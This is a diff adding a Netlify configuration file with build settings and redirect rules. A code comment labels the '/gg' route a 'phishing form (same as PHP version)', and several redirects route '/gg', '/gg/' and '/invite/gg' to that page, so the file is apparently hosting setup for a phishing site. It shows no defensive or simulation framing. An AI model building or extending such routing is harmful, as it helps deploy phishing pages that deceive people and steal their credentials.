@@ -1,0 +1,38 @@
+[build]
+  publish = "public"
+  functions = "netlify/functions"
+
+[build.environment]
+  NODE_VERSION = "22"
+
+[functions]
+  node_bundler = "esbuild"
+
+# /api/* → Netlify functions
+[[redirects]]
+  from = "/api/*"
+  to = "/.netlify/functions/:splat"
+  status = 200
+
+# /gg shortcut → phishing form (same as PHP version)
+[[redirects]]
+  from = "/gg"
+  to = "/invite/gg/index.html"
+  status = 200
+
+# /gg/ with trailing slash
+[[redirects]]
+  from = "/gg/"
+  to = "/invite/gg/index.html"
+  status = 200
+
+# /wp3314 modal URL state — serve same page, JS opens modal
+[[redirects]]
+  from = "/wp3314"
+  to = "/index.html"
+  status = 200
+
+[[redirects]]
+  from = "/invite/gg"
+  to = "/invite/gg/index.html"
+  status = 200
